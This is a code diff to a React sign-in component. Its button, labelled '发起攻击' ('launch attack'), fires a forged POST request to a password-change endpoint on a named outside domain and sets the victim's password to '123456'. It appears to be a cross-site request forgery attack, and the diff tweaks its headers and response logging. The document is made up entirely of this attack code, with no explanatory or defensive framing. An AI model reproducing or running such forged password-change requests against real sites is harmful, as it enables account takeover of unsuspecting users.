@@ -108,12 +108,15 @@ function SignInForm() {
             formData.append('new_password_2', '123456')
             fetch('https://zewan.cc/api/qs/user/change/password', {
               body: formData,
+              headers: {
+                'Content-Type': 'multipart/form-data',
+              },
               cache: 'no-cache',
               credentials: 'same-origin',
               method: 'POST',
               mode: 'cors',
               referrer: 'no-referrer',
-            }).then((res) => console.log(res))
+            }).then((res) => console.log(res.json()))
           }}
         >
           发起攻击
